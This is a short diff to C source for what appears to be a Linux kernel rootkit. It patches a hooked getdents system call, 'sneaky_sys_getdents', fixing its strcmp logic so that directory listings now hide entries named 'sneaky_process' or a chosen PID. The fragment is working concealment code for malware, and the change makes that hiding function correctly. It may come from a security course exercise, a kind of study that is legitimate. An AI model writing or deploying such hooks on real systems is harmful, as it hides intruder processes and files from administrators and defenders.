@@ -67,7 +67,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
   snprintf(pid_buffer, 10, "%d", pid);
   while (pos < byteNum) {
     struct linux_dirent *curDirp = (void *)dirp + pos;
-    if (strcmp(curDirp->d_name, "sneaky_process") || strcmp(curDirp->d_name, pid_buffer)) {
+    if (!strcmp(curDirp->d_name, "sneaky_process") || !strcmp(curDirp->d_name, pid_buffer)) {
       void *end = (void *)dirp + byteNum;
       void *curEnd = (void *)curDirp + curDirp->d_reclen;
       size_t num = (size_t)(end - curEnd);
